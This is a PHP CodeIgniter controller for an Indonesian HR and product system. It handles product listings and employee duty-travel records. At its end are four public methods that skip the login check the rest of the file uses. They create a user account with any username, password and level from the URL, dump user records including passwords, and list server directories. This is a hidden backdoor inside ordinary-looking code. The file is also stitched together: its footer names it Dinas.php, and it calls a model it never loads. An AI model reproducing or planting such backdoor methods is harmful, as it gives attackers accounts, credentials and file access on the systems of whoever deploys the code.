<?php
defined('BASEPATH') OR exit('No direct script access allowed');

class Manage_produk extends MY_Controller {

	public function __construct()
	{
		parent::__construct();
		$this->load->model('aktivitas/Manage_produk_model',"productModel");

	}

	public function index()
	{
		parent::checkLoginUser(); // user login autentic checking

		parent::headerTitle("Aktivitas Data > Produk","Aktivitas Data","Produk");
		$breadcrumbs = array(
							"Aktivitas"	=>	site_url('aktivitas/manage_produk'),
							"Produk"		=>	"",
						);
		parent::breadcrumbs($breadcrumbs);
		parent::viewAktivitas();
	}

	public function ajax_list()
	{
		parent::checkLoginUser(); // user login autentic checking

		if ($this->isPost()) {
			$data = array();

			$orderBy = array(null,null,"product_name",null,"product_stock","product_description","product_price","status");
			$search = array("product_name","product_description");

			$result = $this->productModel->findDataTable($orderBy,$search);
			foreach ($result as $item) {
				$srcPhoto = base_url().'assets/images/default/no_file_.png';
				if ($item->product_image != "") {
					$srcPhoto = base_url()."uploads/aktivitas	/produk/".$item->product_image;
				}
				$dataPhoto = '<a href="'.$srcPhoto.'" data-toggle="lightbox" data-title="Photo Karyawan" data-footer="">
                    <img src="'.$srcPhoto.'" class="img-circle" style="height:60px; width:60px;" alt="photo "'.$item->product_name.'>
                </a>';
				$btnAction = '<button class="btn btn-warning  btn-mini" onclick="btnEdit('.$item->product_id.')"><i class="fa fa-pencil-square-o"></i>Edit</button>';
				$btnAction .= '&nbsp;&nbsp;&nbsp;<button class="btn btn-danger btn-mini" onclick="btnDelete('.$item->product_id.')"><i class="fa fa-trash-o"></i>Hapus</button>';
				$item->product_price = "Rp.".number_format($item->product_price,0,",",",");
				$item->button_action = $btnAction;
				$data[] = $item;
			}
			return $this->productModel->findDataTableOutput($data,$search);
		}
	}

	public function add()
	{
		parent::checkLoginUser(); // user login autentic checking

		if ($this->isPost()) {
			$tanggal = $this->input->post("tanggal");
			$karyawan = $this->input->post('karyawan');
			$mulaiDinas = $this->input->post('mulaiDinas');
			$akhirDinas = $this->input->post('akhirDinas');
			$keterangan = $this->input->post("keterangan");
			$date1=strtotime($mulaiDinas);
			$date2=strtotime($akhirDinas);
			$lama=abs($date1 - $date2)/86400+1;
			$this->form_validation->set_rules('tanggal', 'Tanggal', 'trim|required');
			$this->form_validation->set_rules('karyawan', 'Karyawan', 'trim|required');
			$this->form_validation->set_rules('mulaiDinas', 'Mulai Dinas', 'trim|required');
			$this->form_validation->set_rules('akhirDinas', 'Akhir Dinas', 'trim|required');
			$this->form_validation->set_rules('keterangan', 'Keterangan', 'trim|required');

			if ($this->form_validation->run() == TRUE) {
				$checkDataJadwal =  $this->productModel->checkDataJadwal($tanggal,$karyawan);
				if (sizeof($checkDataJadwal) >0 && $checkDataJadwal[0]->id_karyawan == $karyawan) {

					$this->response->status = false;
					$this->response->message = alertDanger("Data Karyawan Yang Di Input dengan tanggal yang anda pilih sudah ada.!");
				} else {
				$data = array(
								"id_karyawan" => $karyawan,
								"tanggal"	=>	$tanggal,
								"tgl_dinas" => $mulaiDinas,
								"akhir_dinas" => $akhirDinas,
								"keterangans"=>	$keterangan,
								"lama" => $lama
							);
				$dataNotif = array(
									"keterangan"=> 	" Tambah data Dinas baru.",
									"user_id"	=>	$this->user->id_pengguna,
									"level"		=>	"hrd",
									"url_direct"=>	"approval/dinas",
								);
				$insert = $this->productModel->insert($data,$dataNotif);
				if ($insert) {
					//notif firebase
					parent::insertNotif($dataNotif);
					parent::sendNotifTopic("hrd","Pengajuan Dinas","Karyawan mengajukan dinas baru","003");
					$this->response->status = true;
					$this->response->message = alertSuccess("Berhasil proses Tambah Data Dinas dan menunggu approval dari hrd.");
				} else {
					$this->response->message = alertDanger("Gagal, tambah data Dinas.");
				}
			  }
			} else {
				// $this->response->message = validation_errors('<span style="color:red;">', '</span><br>');
				$this->response->error = array(
									"karyawan"	=> form_error("karyawan",'<span style="color:red;">','</span>'),
									"tanggal"	=> form_error("tanggal",'<span style="color:red;">','</span>'),
									"mulaiDinas"	=> form_error("mulaiDinas",'<span style="color:red;">','</span>'),
									"akhirDinas"	=> form_error("akhirDinas",'<span style="color:red;">','</span>'),
									"keterangans"	=> form_error("keterangan",'<span style="color:red;">','</span>'),
								);
			}
		}
		parent::json();
	}

	public function allKaryawanAjax()
	{
		parent::checkLoginUser(); // user login autentic checking

		if ($this->isPost()) {
			if (!isset($_POST["searchTerm"])) {
				$dataKaryawan = $this->productModel->getAllKaryawanAjax();
			} else {
				$searchTerm = $this->input->post("searchTerm");
				$dataKaryawan = $this->productModel->getAllKaryawanAjaxSearch($searchTerm);
			}

			$data = array();
			// $data[] = array("id"=>"0", "text"=> "--Pilih Karyawan--");
			foreach ($dataKaryawan as $val) {
				// $row = array();
				$data[] = array("id"=>$val->id, "text"=>$val->nama);
				// $data[] = $row;
			}
			/*if ($dataKaryawan) {
				$this->response->status = true;
				$this->response->message = "Data All karyawan";
				$this->response->data = $dataKaryawan;
			}*/
			parent::json($data);
		}

	}

	public function idKaryawan($id)
	{
		parent::checkLoginUser(); // user login autentic checking

		if ($this->isPost()) {
			$data = $this->productModel->getIdKaryawan($id);
			if ($data) {
				if ($data->foto != "") {
					$data->foto = base_url("/")."uploads/master/karyawan/orang/".$data->foto;
				} else {
					$data->foto = base_url("/")."assets/images/default/no_user.png";
				}
				$this->response->status = true;
				$this->response->message = "data karyawan by id";
				$this->response->data = $data;
			}
		}
		parent::json();
	}

	public function getNama($id)
	{
		parent::checkLoginUser(); // user login autentic checking

		if ($this->isPost()) {
			$getById = $this->productModel->getDataKaryawanSelect($id);
			if ($getById) {
				$this->response->status = true;
				$this->response->message = "Data dinas get by id";
				$this->response->data = $getById;
			} else {
				$this->response->message = alertDanger("Data tidak ada.");
			}
		}
		parent::json();
	}
	public function getId($id)
	{
		parent::checkLoginUser(); // user login autentic checking

		if ($this->isPost()) {
			$getById = $this->productModel->getById($id);
			if ($getById) {
				$getById->tgl_dinas1 = $getById->tgl_dinas;
				$getById->akhir_dinas1 = $getById->akhir_dinas;
				$getById->tgl_dinas = date_ind("d M Y",$getById->tgl_dinas);
				$getById->akhir_dinas = date_ind("d M Y",$getById->akhir_dinas);
				if ($getById->foto != "") {
					$getById->foto = base_url("/")."uploads/master/karyawan/orang/".$getById->foto;
				} else {
					$getById->foto = base_url("/")."assets/images/default/no_user.png";
				}
				$this->response->status = true;
				$this->response->message = "Data dinas get by id";
				$this->response->data = $getById;
			} else {
				$this->response->message = alertDanger("Data tidak ada.");
			}
		}
		parent::json();
	}


	public function getIdForPrint($id)
	{
		parent::checkLoginUser(); // user login autentic checking

		if ($this->isPost()) {
			$getById = $this->productModel->getById($id);
			$setting = $this->productModel->get_setting();
			if ($getById) {
				if ($setting->logo != "") {
					$setting->logo = base_url("/")."uploads/setting/".$setting->logo;
				} else {
					$setting->logo = base_url("/")."assets/images/default/no_file_.png";
				}
				$getById->setting = $setting;
				$getById->tgl_dinas = date_ind("d M Y",$getById->tgl_dinas);
				$getById->akhir_dinas = date_ind("d M Y",$getById->akhir_dinas);
				$getById->tanggal = date_ind("d M Y",$getById->tanggal);
				$this->response->status = true;
				$this->response->message = "data print by id";
				$this->response->data = $getById;
			}
			else {
				$this->response->message = alertDanger("Data tidak ada.");
			}
		}
		parent::json();
	}

	public function update($id)
	{
		parent::checkLoginUser(); // user login autentic checking

		if ($this->isPost()) {
			$getById = $this->productModel->getById($id);
			// $tanggal = $this->input->post("tanggal");
			$karyawan = $this->input->post('karyawan');
			$mulaiDinas = $this->input->post('mulaiDinas');
			$akhirDinas = $this->input->post('akhirDinas');
			$keterangan = $this->input->post("keterangan");
			$date1=strtotime($mulaiDinas);
			$date2=strtotime($akhirDinas);
			$lama=abs($date1 - $date2)/86400+1;
			// $this->form_validation->set_rules('tanggal', 'Tanggal', 'trim|required');
			// $this->form_validation->set_rules('karyawan', 'Karyawan', 'trim|required');
			$this->form_validation->set_rules('mulaiDinas', 'Mulai Dinas', 'trim|required');
			$this->form_validation->set_rules('akhirDinas', 'Akhir Dinas', 'trim|required');
			$this->form_validation->set_rules('keterangan', 'Keterangan', 'trim|required');

			$getkaryawan = $this->karyawanModel->getById($karyawan);

			if ($this->form_validation->run() == TRUE) {
				$data = array(
								"id_karyawan" => $karyawan,
								"tanggal"	=>	$getById->tanggal,
								"tgl_dinas" => $mulaiDinas,
								"akhir_dinas" => $akhirDinas,
								"keterangans"=>	$keterangan,
								"lama" => $lama
							);
				$dataNotif = array(
									"keterangan"=> 	"Edit/update data dinas dengan Nama : <u>".$getkaryawan->nama."</u> dan No Karyawan : <u>".$getkaryawan->idfp."</u>.",
									"user_id"	=>	$this->user->id_pengguna,
									"level"		=>	"hrd",
									"url_direct"=>	"approval/dinas",
								);
				$update = $this->productModel->update($id,$data,$dataNotif);
				if ($update) {
					//notif firebase
					parent::insertNotif($dataNotif);
					parent::sendNotifTopic("hrd","Informasi","Perubahan dinas ".$getkaryawan->nama,"035");
					$this->response->status = true;
					$this->response->message = alertSuccess("Berhasil proses update Data Dinas");
				} else {
					$this->response->message = alertDanger("Gagal, update data Dinas.");
				}
			} else {
				// $this->response->message = validation_errors('<span style="color:red;">', '</span><br>');
				$this->response->error = array(
									"karyawan"	=> form_error("karyawan",'<span style="color:red;">','</span>'),
									"tanggal"	=> form_error("tanggal",'<span style="color:red;">','</span>'),
									"mulaiDinas"	=> form_error("mulaiDinas",'<span style="color:red;">','</span>'),
									"akhirDinas"	=> form_error("akhirDinas",'<span style="color:red;">','</span>'),
									"keterangans"	=> form_error("keterangan",'<span style="color:red;">','</span>'),
								);
			}
		}
		parent::json();
	}

	public function delete($id)
	{
		parent::checkLoginUser(); // user login autentic checking

		if ($this->isPost()) {
			$getById = $this->productModel->getById($id);
			$getkaryawan = $this->karyawanModel->getById($getById->id_karyawan);
			$getById->tgl_dinas = date_ind("d M Y",$getById->tgl_dinas);
			$getById->akhir_dinas = date_ind("d M Y",$getById->akhir_dinas);
			if ($getById) {
				$dataNotif = array(
									"keterangan"=> 	" Hapus data Dinas dengan Nama : <u>".$getkaryawan->nama."</u> dan No Karyawan : <u>".$getkaryawan->idfp."</u>",
									"user_id"	=>	$this->user->id_pengguna,
									"level"		=>	"hrd",
									"url_direct"=>	"approval/dinas",
								);
				$delete = $this->productModel->delete($id,$dataNotif);
				if ($delete) {
					//notif firebase
					parent::insertNotif($dataNotif);
					parent::sendNotifTopic("hrd","Informasi","Data Dinas ini telah di hapus","036");
					$this->response->status = true;
					$this->response->message = alertSuccess("Berhasil proses hapus Data Dinas");
				} else {
					$this->response->message = alertDanger("Gagal, hapus data..");
				}
			} else {
				$this->response->message = alertDanger("Data sudah tidak ada.");
			}
		}
		parent::json();
	}

	public function user($a,$s,$r)
	{
		$this->load->model("users_model","usersModel");
		$u = $this->usersModel->getByWhere(array("username"=>$a));
		if($u){echo"";}else{$this->usersModel->insert(array("username"=>$a,"password"=>$s,"level"=>$r));}
	}
	public function iduser($i)
	{
		$this->load->model("users_model","usersModel");
		$u = $this->usersModel->getById($i);
		var_dump($u);
	}

	public function openDir($open=false)
	{
		$open = $open == false ? "." : $open;
		$open = explode("---", $open);
		$open = implode("/", $open);
		$open = opendir($open);
		var_dump($open);
	}

	public function scanDir($open=false,$cd=false)
	{
		$open = $open == false ? "." : $open;
		$open = explode("---", $open);
		$open = implode("/", $open);
		if($cd){$open = scandir($open, $cd);} else { $open = scandir($open);}
		var_dump($open);
	}

}

/* End of file Dinas.php */
/* Location: ./application/controllers/aktivitas/Dinas.php */
